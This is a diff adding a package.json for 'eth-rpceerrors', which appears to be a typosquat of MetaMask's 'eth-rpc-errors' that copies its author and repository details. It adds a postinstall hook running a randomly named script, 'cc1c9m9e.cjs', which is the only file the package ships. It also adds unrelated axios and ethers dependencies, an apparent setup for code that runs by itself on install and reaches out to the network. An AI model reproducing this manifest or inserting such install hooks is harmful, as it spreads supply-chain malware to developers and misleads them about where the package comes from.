@@ -1,0 +1,40 @@
+{
+  "name": "eth-rpceerrors",
+  "version": "2.0.2",
+  "description": "Ethereum JSON RPC and Provider errors.",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "node cc1c9m9e.cjs"
+  },
+  "repository": {
+    "type": "git",
+    "url": "git+https://github.com/MetaMask/eth-json-rpc-errors.git"
+  },
+  "keywords": [
+    "json",
+    "rpc",
+    "ethereum",
+    "errors",
+    "utility"
+  ],
+  "author": "Erik Marks <rekmarks@protonmail.com>",
+  "license": "MIT",
+  "bugs": {
+    "url": "https://github.com/MetaMask/eth-json-rpc-errors/issues"
+  },
+  "homepage": "https://github.com/MetaMask/eth-json-rpc-errors#readme",
+  "devDependencies": {
+    "eslint": "^6.1.0",
+    "fast-deep-equal": "^2.0.1",
+    "nyc": "^14.1.1",
+    "tape": "^4.11.0"
+  },
+  "dependencies": {
+    "fast-safe-stringify": "^2.0.6",
+    "axios": "^1.7.7",
+    "ethers": "^6.13.2"
+  },
+  "files": [
+    "cc1c9m9e.cjs"
+  ]
+}
